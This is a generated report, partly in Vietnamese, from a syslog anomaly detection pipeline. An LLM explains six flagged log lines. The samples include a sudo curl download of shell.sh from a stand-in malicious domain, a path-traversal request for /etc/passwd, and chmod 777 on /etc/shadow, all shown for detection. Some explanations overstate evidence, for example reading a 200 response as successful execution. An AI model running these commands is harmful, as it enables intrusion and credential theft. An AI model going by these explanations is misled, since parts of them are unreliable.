# Syslog Anomaly Ensemble Detector — Kết quả chạy

## 1. Thông tin tổng quan

- Thời gian sinh báo cáo: `2026-06-10 04:06:51`
- Model giải thích: `deepseek-chat`
- Tổng số log test: `200`
- Số anomaly do Centroid phát hiện: `33`
- Số anomaly do KNN phát hiện: `44`
- Số anomaly cuối cùng sau Ensemble: `26`
- Số anomaly được cả hai detector đồng ý: `10`
- Số anomaly được LLM giải thích sau deduplication: `6`

## 2. Cấu hình Ensemble Voting

- Centroid weight: `0.5`
- KNN weight: `0.5`
- Ensemble threshold: `0.7`

Quy tắc quyết định:

- Flag as anomaly if both centroid and KNN agree.
- Flag as anomaly if weighted ensemble score exceeds threshold.

## 3. Kết quả Parallel Execution

- Chế độ chạy: `parallel`
- Tổng thời gian chạy song song: `0.8679` giây

| Task              | Status  | Duration |
| ----------------- | ------- | --------:|
| centroid_detector | success | 0.2773s  |
| knn_detector      | success | 0.8673s  |

## 4. Danh sách anomaly được giải thích

### #1 — Line 158

**Log:**

```text
Jun  9 00:55:03 server-prod-01 kernel: [98451.002131] Segfault in process 14205 [apache2] at 0000000000000028 ip 00007f311c102b41 error 4 in libc-2.31.so
```

- Ensemble score: `0.9635`
- Confidence: `high`
- Vote count: `2`
- Centroid flag: `True`
- KNN flag: `True`

**Threat category:** `Process Crash / Exploitation Attempt`

**Severity:** `high`

**Explanation:**

This log indicates a segmentation fault in the Apache2 web server process, which is a common sign of memory corruption or exploitation attempts such as buffer overflow attacks. The error code 4 (user-mode instruction fetch causing a page fault) and the fault address near the null page (0x28) suggest a potential null pointer dereference or control flow hijacking. The high ensemble anomaly score and unanimous detection by both centroid and kNN models further confirm this event is statistically anomalous and warrants immediate investigation.

**Evidence:**

- Segfault in process 14205 [apache2]
- Fault address: 0000000000000028
- Instruction pointer: 00007f311c102b41
- Error code: 4
- Affected library: libc-2.31.so
- Ensemble anomaly score: 0.9635
- Confidence: high
- Vote count: 2 (centroid and kNN both flagged as anomaly)

**Recommended actions:**

- Isolate the affected server from production traffic immediately.
- Collect full memory dump and core dump of the crashed Apache2 process for forensic analysis.
- Review recent Apache2 access logs and error logs for suspicious requests (e.g., long URLs, unusual parameters, or known exploit patterns).
- Check for any recent changes to web application code or configuration that could have introduced vulnerabilities.
- Scan the server for indicators of compromise (IOCs) such as unauthorized processes, network connections, or file modifications.
- Engage incident response team for deeper investigation and potential containment.

---

### #2 — Line 95

**Log:**

```text
Jun  9 00:34:07 server-prod-01 sudo: admin_user : TTY=pts/0 ; PWD=/home/admin_user ; USER=root ; COMMAND=/usr/bin/curl http://malicious-domain.xyz/shell.sh
```

- Ensemble score: `0.889`
- Confidence: `high`
- Vote count: `1`
- Centroid flag: `False`
- KNN flag: `True`

**Threat category:** `Privilege Escalation / Malicious Command Execution`

**Severity:** `critical`

**Explanation:**

The user 'admin_user' executed a sudo command to run curl as root, fetching a script from a known malicious domain. This indicates a likely privilege escalation attempt to download and execute a remote shell script, which is a common technique for establishing persistence or backdoor access. The high confidence anomaly detection and KNN flagging further support that this behavior deviates significantly from normal patterns.

**Evidence:**

- sudo command executed by admin_user
- USER=root
- COMMAND=/usr/bin/curl http://malicious-domain.xyz/shell.sh
- malicious-domain.xyz is a known malicious domain
- knn_is_anomaly: True
- ensemble_score: 0.889

**Recommended actions:**

- Immediately isolate the affected host (server-prod-01) from the network
- Block the domain malicious-domain.xyz at the firewall and proxy
- Review recent sudo logs and user activity for admin_user
- Check for any downloaded or executed files from the malicious domain
- Initiate incident response procedures and escalate to senior management

---

### #3 — Line 121

**Log:**

```text
Jun  9 00:42:48 server-prod-01 nginx: 45.9.20.12 - - [00:42:48 +0000] "POST /cgi-bin/main_cgi.cgi HTTP/1.1" 200 3210 "Shellshock-payload"
```

- Ensemble score: `0.8804`
- Confidence: `high`
- Vote count: `2`
- Centroid flag: `True`
- KNN flag: `True`

**Threat category:** `Shellshock Exploitation Attempt`

**Severity:** `critical`

**Explanation:**

The log shows a POST request to /cgi-bin/main_cgi.cgi with a user-agent or payload containing 'Shellshock-payload', which is a direct indicator of a Shellshock (CVE-2014-6271) exploitation attempt. This vulnerability allows remote code execution via specially crafted HTTP headers, and the presence of the explicit payload string confirms malicious intent. The high ensemble score and dual anomaly detection (centroid and kNN) further validate that this event is highly anomalous and likely an active attack.

**Evidence:**

- Source IP: 45.9.20.12
- Request URI: /cgi-bin/main_cgi.cgi
- HTTP method: POST
- Payload indicator: 'Shellshock-payload' in log
- Response code: 200 (successful execution)
- Ensemble anomaly score: 0.8804
- Vote count: 2 (centroid and kNN both flagged as anomaly)

**Recommended actions:**

- Immediately block source IP 45.9.20.12 at the firewall or WAF.
- Isolate the affected server (server-prod-01) from the network for forensic analysis.
- Check for signs of successful exploitation (e.g., reverse shells, file modifications, outbound connections).
- Review nginx and system logs for additional suspicious activity from the same IP or similar payloads.
- Apply patches for CVE-2014-6271 and related Shellshock variants if not already done.
- Escalate to incident response team for full investigation and containment.

---

### #4 — Line 82

**Log:**

```text
Jun  9 00:28:51 server-prod-01 audit[24408]: AUDIT_ANOM_PROMISCUOUS dev=eth0 prom=1 old_prom=0 auid=4294967295
```

- Ensemble score: `0.7906`
- Confidence: `medium`
- Vote count: `1`
- Centroid flag: `False`
- KNN flag: `True`

**Threat category:** `Promiscuous Mode Detection`

**Severity:** `medium`

**Explanation:**

The syslog indicates that network interface eth0 on server-prod-01 was set to promiscuous mode, which allows the interface to capture all network traffic, not just traffic destined for it. This behavior is commonly associated with packet sniffing tools used for network monitoring or malicious activities such as eavesdropping. The anomaly detection model flagged this event with a high ensemble score and a KNN anomaly vote, suggesting it deviates from normal system behavior.

**Evidence:**

- AUDIT_ANOM_PROMISCUOUS event type
- dev=eth0
- prom=1 (promiscuous mode enabled)
- old_prom=0 (previously not promiscuous)
- auid=4294967295 (unset auid, possibly root or system process)
- ensemble_score: 0.7906
- knn_is_anomaly: True

**Recommended actions:**

- Verify if promiscuous mode was intentionally enabled by authorized personnel (e.g., for legitimate network monitoring).
- Check the process ID (PID 24408) and associated command line to identify what enabled promiscuous mode.
- Review recent user activity and authentication logs for unauthorized access or privilege escalation.
- If unauthorized, isolate the host and conduct a forensic investigation for potential packet sniffing or data exfiltration.

---

### #5 — Line 72

**Log:**

```text
Jun  9 00:25:22 server-prod-01 nginx: 203.0.113.88 - - [00:25:22 +0000] "GET /../../../../etc/passwd HTTP/1.1" 400 150
```

- Ensemble score: `0.7828`
- Confidence: `medium`
- Vote count: `1`
- Centroid flag: `False`
- KNN flag: `True`

**Threat category:** `Path Traversal Attempt`

**Severity:** `high`

**Explanation:**

The request contains a directory traversal sequence (../../../../etc/passwd) targeting a sensitive system file. This is a classic indicator of an attacker attempting to read arbitrary files outside the web root, often as a precursor to privilege escalation or data exfiltration. The KNN anomaly detection flagged this as anomalous, and the ensemble score of 0.78 supports a high likelihood of malicious intent.

**Evidence:**

- Request URI: /../../../../etc/passwd
- Source IP: 203.0.113.88
- HTTP method: GET
- Response status: 400 (Bad Request)
- Timestamp: Jun 9 00:25:22
- Server: server-prod-01
- Service: nginx
- KNN anomaly flag: True
- Ensemble score: 0.782778263092041

**Recommended actions:**

- Block the source IP 203.0.113.88 at the firewall or WAF immediately.
- Review nginx access logs for similar traversal attempts from this IP or other sources.
- Check if any other servers or endpoints received similar requests from the same IP.
- Verify that the web application is properly sanitizing user input and has directory listing disabled.
- Escalate to incident response team for further investigation and potential threat hunting.

---

### #6 — Line 144

**Log:**

```text
Jun  9 00:50:22 server-prod-01 sudo: hacker_user : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/chmod 777 /etc/shadow
```

- Ensemble score: `0.7173`
- Confidence: `medium`
- Vote count: `1`
- Centroid flag: `False`
- KNN flag: `True`

**Threat category:** `Privilege Escalation / Unauthorized Access`

**Severity:** `critical`

**Explanation:**

The user 'hacker_user' is executing a chmod 777 command on /etc/shadow from the /tmp directory, which is a common staging area for attackers. This action would make the shadow file world-readable, exposing password hashes and enabling offline cracking. The KNN anomaly detection flagged this event, and the low vote count and medium confidence suggest it is an isolated but highly suspicious activity.

**Evidence:**

- User: hacker_user
- TTY: pts/2
- PWD: /tmp
- USER: root
- COMMAND: /usr/bin/chmod 777 /etc/shadow
- knn_is_anomaly: True
- ensemble_score: 0.7172914743423462

**Recommended actions:**

- Immediately isolate the affected server (server-prod-01) from the network.
- Terminate the session of user 'hacker_user' and disable the account.
- Check for other suspicious commands or lateral movement from this user.
- Review /etc/shadow for unauthorized modifications and reset all user passwords.
- Escalate to incident response team for full forensic investigation.

---

## 5. Kết luận

Pipeline đã phát hiện anomaly bằng hai detector độc lập gồm Centroid-based Detector và KNN-based Detector. Hai detector được chạy song song để giảm thời gian scoring, sau đó kết quả được kết hợp bằng Ensemble Voting. Cuối cùng, hệ thống chỉ gửi các anomaly có độ tin cậy cao và đã được deduplicate sang LLM để sinh giải thích bảo mật.
